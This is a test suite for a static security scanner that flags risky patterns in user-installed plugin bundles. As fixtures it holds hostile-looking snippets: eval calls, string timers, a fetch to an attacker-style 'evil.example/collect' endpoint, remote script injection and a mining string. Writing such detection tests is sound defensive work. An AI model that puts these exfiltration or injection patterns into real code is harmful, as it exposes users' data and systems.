import { scanPluginBundle } from "../../src/modules/plugins/security-scan.js";

/**
 * Plugin bundle security scanner tests (v1.8.0).
 *
 * The scanner is the engine's static-analysis layer over user-installed
 * bundle.js files: it reports patterns, never executes anything. These tests
 * pin the pattern table (high/medium/low), the loopback whitelist, severity
 * aggregation, and evidence handling.
 */
describe("scanPluginBundle", () => {
	it("returns a clean report for a bundle with no risky patterns", () => {
		const report = scanPluginBundle(
			`export function view() { return "hello"; }`,
		);
		expect(report.severity).toBe("clean");
		expect(report.flags).toEqual([]);
		expect(report.scannedAt).toEqual(expect.any(String));
	});

	it("flags eval() and the Function constructor as HIGH", () => {
		const report = scanPluginBundle(
			`const a = eval("1+1"); const b = new Function("return 1");`,
		);
		expect(report.severity).toBe("high");
		const ids = report.flags.map((f) => f.id);
		expect(ids).toContain("eval");
		expect(ids).toContain("function-constructor");
	});

	it("flags string timers as HIGH", () => {
		const report = scanPluginBundle(`setTimeout("alert(1)", 100);`);
		expect(report.severity).toBe("high");
		expect(report.flags.some((f) => f.id === "string-timer")).toBe(true);
	});

	it("flags template-literal string timers as HIGH too", () => {
		const report = scanPluginBundle(
			"setTimeout(`document.domain='evil'`, 100); setInterval(`x`, 50);",
		);
		expect(report.severity).toBe("high");
		const timer = report.flags.find((f) => f.id === "string-timer");
		expect(timer).toBeDefined();
		expect(timer?.count).toBe(2);
	});

	it("flags protocol-relative network egress but not loopback", () => {
		const report = scanPluginBundle(
			`fetch("//evil.example/collect"); fetch("//127.0.0.1:34117/plugins/x");`,
		);
		expect(report.severity).toBe("medium");
		const net = report.flags.find((f) => f.id === "network-apis");
		expect(net).toBeDefined();
		expect(net?.count).toBe(1);
		expect(net?.evidence).toBe("//evil.example/collect");
	});

	it("flags dynamic <script> injection and remote import() as HIGH", () => {
		const report = scanPluginBundle(
			`const s = document.createElement("script"); s.src = "https://evil.example/x.js"; import("https://evil.example/y.js");`,
		);
		expect(report.severity).toBe("high");
		const ids = report.flags.map((f) => f.id);
		expect(ids).toContain("script-injection");
		expect(ids).toContain("remote-import");
	});

	it("flags DOM-injection sinks as MEDIUM", () => {
		const report = scanPluginBundle(
			`el.innerHTML = "<b>hi</b>"; document.write("x");`,
		);
		expect(report.severity).toBe("medium");
		expect(report.flags.some((f) => f.id === "dom-xss")).toBe(true);
	});

	it("flags external URLs but ignores loopback engine calls", () => {
		const report = scanPluginBundle(
			`fetch("https://evil.example/api"); fetch("http://127.0.0.1:34117/plugins/x/bundle"); fetch("/plugins/x/icons.json");`,
		);
		expect(report.severity).toBe("medium");
		expect(report.flags.some((f) => f.id === "external-url")).toBe(true);
		const net = report.flags.find((f) => f.id === "network-apis");
		// Only the external call is flagged — loopback + relative are benign.
		expect(net).toBeDefined();
		expect(net?.count).toBe(1);
	});

	it("flags network APIs whose target is computed (not a literal URL)", () => {
		const report = scanPluginBundle(`fetch(userSuppliedUrl);`);
		expect(report.severity).toBe("medium");
		const net = report.flags.find((f) => f.id === "network-apis");
		expect(net).toBeDefined();
		expect(net?.evidence).toContain("fetch");
	});

	it("flags non-http schemes like WebSocket", () => {
		const report = scanPluginBundle(`new WebSocket("wss://push.example.com");`);
		expect(report.severity).toBe("medium");
		const net = report.flags.find((f) => f.id === "network-apis");
		expect(net?.evidence).toBe("wss://push.example.com");
	});

	it("flags hardcoded IPs but not loopback", () => {
		const report = scanPluginBundle(
			`const ip = "192.168.1.10"; const local = "127.0.0.1";`,
		);
		expect(report.severity).toBe("medium");
		const ip = report.flags.find((f) => f.id === "hardcoded-ip");
		expect(ip).toBeDefined();
		expect(ip?.evidence).toBe("192.168.1.10");
		expect(ip?.count).toBe(1);
	});

	it("flags Node built-ins and mining strings as LOW", () => {
		const report = scanPluginBundle(
			`const fs = require("fs"); process.env; const pool = "cryptonight";`,
		);
		expect(report.severity).toBe("low");
		expect(report.flags.some((f) => f.id === "node-builtins")).toBe(true);
		expect(report.flags.some((f) => f.id === "crypto-mining")).toBe(true);
	});

	it("aggregates severity to the worst flag", () => {
		const report = scanPluginBundle(`eval("x"); el.innerHTML = "y";`);
		expect(report.severity).toBe("high");
	});

	it("truncates long evidence snippets", () => {
		const long = `fetch("https://very-long-domain.example.com/${"a".repeat(200)}")`;
		const report = scanPluginBundle(long);
		const flag = report.flags.find((f) => f.id === "external-url");
		expect(flag?.evidence.length).toBeLessThanOrEqual(121);
		expect(flag?.evidence.endsWith("…")).toBe(true);
	});

	it("matches minified bundles", () => {
		const report = scanPluginBundle(
			`!function(){"use strict";const a=eval("1")}();`,
		);
		expect(report.severity).toBe("high");
		expect(report.flags.some((f) => f.id === "eval")).toBe(true);
	});

	it("counts repeated occurrences of the same pattern", () => {
		const report = scanPluginBundle(
			`fetch("https://a.example"); fetch("https://b.example");`,
		);
		const flag = report.flags.find((f) => f.id === "external-url");
		expect(flag?.count).toBe(2);
	});
});
